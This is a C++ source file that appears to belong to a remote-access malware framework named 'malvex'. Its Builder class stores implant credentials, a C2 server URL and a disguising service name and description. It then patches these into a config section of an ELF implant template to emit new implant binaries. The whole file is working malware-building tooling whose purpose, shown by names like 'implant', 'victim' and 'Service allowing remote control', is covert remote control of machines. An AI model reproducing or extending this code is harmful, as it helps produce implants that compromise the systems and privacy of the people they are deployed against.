#include "Builder.hpp"
#include "LogManager.hpp"
#include "Types.hpp"
#include <ImplantConfig.hpp>

#include <elfio/elfio.hpp>

#include <cstring>
#include <filesystem>
#include <iterator>

//--------------------------------
//
//--------------------------------
Builder& Builder::instance(const std::string& db_path) {
    static Builder instance(db_path);
    return instance;
}

//-------------------------------------------------
//
//-------------------------------------------------
Builder::Builder(const std::string& db_path) :
    m_conf( Config::instance(db_path)),
    m_log_man( LogManager::instance())
{

}

//-------------------------------------------------
//
//-------------------------------------------------
std::string Builder::getUsername() const noexcept {
    return m_conf.get<std::string>("implant_username", "vicky");
}

//-------------------------------------------------
//
//-------------------------------------------------
std::string Builder::getPassword() const noexcept {
    return m_conf.get<std::string>("implant_password", "victim");
}

//-------------------------------------------------
//
//-------------------------------------------------
std::string Builder::getServerURL() const noexcept {
    return m_conf.get<std::string>("implant_url", "https://127.0.0.1:3000");
}

//-------------------------------------------------
//
//-------------------------------------------------
std::string Builder::getTimeout() const noexcept {
    return m_conf.get<std::string>("implant_timeout", "5");
}

//-------------------------------------------------
//
//-------------------------------------------------
std::string Builder::getOutputDir() const noexcept {
    return m_conf.get<std::string>("implant_output_dir", "./outputs");
}

//-------------------------------------------------
//
//-------------------------------------------------
std::string Builder::getServiceDesc() const noexcept {
    return m_conf.get<std::string>("implant_service_desc", "Service allowing remote control");
}

//-------------------------------------------------
//
//-------------------------------------------------
std::string Builder::getServiceName() const noexcept {
    return m_conf.get<std::string>("implant_service_name", "malvex_implant");
}

//--------------------------------
//
//--------------------------------
void Builder::setUsername(const std::string& username) {
    std::strncpy(m_config.username, username.c_str(), std::size(m_config.username) - 1);
    m_config.username[sizeof(m_config.username) - 1] = '\0';
    m_conf.set("implant_username", username);
}

//--------------------------------
//
//--------------------------------
void Builder::setPassword(const std::string& password) {
    std::strncpy(m_config.password, password.c_str(), std::size(m_config.password) - 1);
    m_config.password[sizeof(m_config.password) - 1] = '\0';
    m_conf.set("implant_password", password);
}

//--------------------------------
//
//--------------------------------
void Builder::setOutputDir(const std::string& output_dir) {
    m_conf.set("implant_output_dir", output_dir);
}

//--------------------------------
//
//--------------------------------
void Builder::setTimeout(const std::string& timeout) {
    std::strncpy(m_config.default_timeout, timeout.c_str(), std::size(m_config.default_timeout) - 1);
    m_config.default_timeout[sizeof(m_config.default_timeout) - 1] = '\0';
    m_conf.set("implant_timeout", timeout);
}

//--------------------------------
//
//--------------------------------
void Builder::setServerURL(const std::string& server_url) {
    std::strncpy(m_config.server_url, server_url.c_str(), std::size(m_config.server_url) - 1);
    m_config.server_url[sizeof(m_config.server_url) - 1] = '\0';
    m_conf.set("implant_url", server_url);
}

//--------------------------------
//
//--------------------------------
void Builder::setServiceName(const std::string& service_name) {
    std::strncpy(m_config.service_name, service_name.c_str(), std::size(m_config.service_name) - 1);
    m_config.service_name[sizeof(m_config.service_name) - 1] = '\0';
    m_conf.set("service_name", service_name);
}

//--------------------------------
//
//--------------------------------
void Builder::setServiceDesc(const std::string& service_description) {
    std::strncpy(m_config.service_desc, service_description.c_str(), std::size(m_config.service_desc) - 1);
    m_config.service_desc[sizeof(m_config.service_desc) - 1] = '\0';
    m_conf.set("implant_service_desc", service_description);
}

//--------------------------------
//
//--------------------------------
bool Builder::buildImplant() {
    using namespace ELFIO;
    auto& log = m_log_man;

    std::filesystem::path input_file("implant");

    // check if the template file exists
    if (not std::filesystem::exists(input_file)) {
        log.local_log("Builder Error: failed to find implant template!");
        return false;
    }

    std::string path = getOutputDir();
    std::filesystem::create_directories(path);

    auto output_file = std::filesystem::path(path.append("/implant_" + std::to_string(generate_nonce())));
    if (std::filesystem::exists(output_file) && std::filesystem::is_regular_file(output_file)) {
        std::filesystem::remove(output_file);
    }

    // copy the template file to the output location
    if (not std::filesystem::copy_file(input_file, output_file)) {
        log.local_log("Builder Error: failed to copy implant template to new path!");
        return false;
    }

    elfio reader;
    if (not reader.load(output_file)) {
        log.local_log("Builder Error: failed to load output file!");
        return false;
    }

    // locate the custom section
    //Elf_Word section_index{ 0 };
    std::string config_section_name = std::string(MALVEX_CONFIG_SECTION_NAME);
    section* config_section = nullptr;

    for (int i{ 0 }; i < reader.sections.size(); ++i) {
        if (reader.sections[i]->get_name() == config_section_name) {
            config_section = reader.sections[i];
            log.local_log("Builder: Config section found!");
            break;
        }
    }

    if (not config_section) {
        log.local_log("Builder Error: No Config section was found!");
        return false;
    }

    // prepare the new configuration data
    ImplantConfig new_config;

    // use strncpy to safely copy and null-terminate the strings
    std::strncpy(new_config.username, m_config.username, sizeof(new_config.username) - 1);
    new_config.username[sizeof(new_config.username) - 1] = '\0';

    std::strncpy(new_config.password, m_config.password, sizeof(new_config.password) - 1);
    new_config.password[sizeof(new_config.password) - 1] = '\0';

    std::strncpy(new_config.default_timeout, m_config.default_timeout, sizeof(new_config.default_timeout) - 1);
    new_config.default_timeout[sizeof(new_config.default_timeout) - 1] = '\0';

    std::strncpy(new_config.server_url, m_config.server_url, sizeof(new_config.server_url) - 1);
    new_config.server_url[sizeof(new_config.server_url) - 1] = '\0';

    std::strncpy(new_config.service_name, m_config.service_name, sizeof(new_config.service_name) - 1);
    new_config.service_name[sizeof(new_config.service_name) - 1] = '\0';

    std::strncpy(new_config.service_desc, m_config.service_desc, sizeof(new_config.service_desc) - 1);
    new_config.service_desc[sizeof(new_config.service_desc) - 1] = '\0';


    // Verify size match
    if (config_section->get_size() != sizeof(ImplantConfig)) {
        log.local_log("Builder Error: New Section Size Missmatch!");
        return false;
    }

    // overwrite the data in the file
    // Get the file offset where the section data resides
    Elf_Xword offset = config_section->get_offset();

    std::fstream file(output_file, std::ios::in | std::ios::out | std::ios::binary);
    if (not file.is_open()) {
        log.local_log("Builder Error: Can't open output file for writing!");
        return false;
    }

    // Seek to the correct offset
    file.seekp(offset);

    // Write the new structure's raw bytes
    file.write(reinterpret_cast<const char*>(&new_config), sizeof(ImplantConfig));

    if (file.fail()) {
        log.local_log("Builder Error: failed to write to output implant file!");
        return false;
    }

    file.close();

    log.local_log("Builder: Saved implant: " + output_file.string());
    return true;
}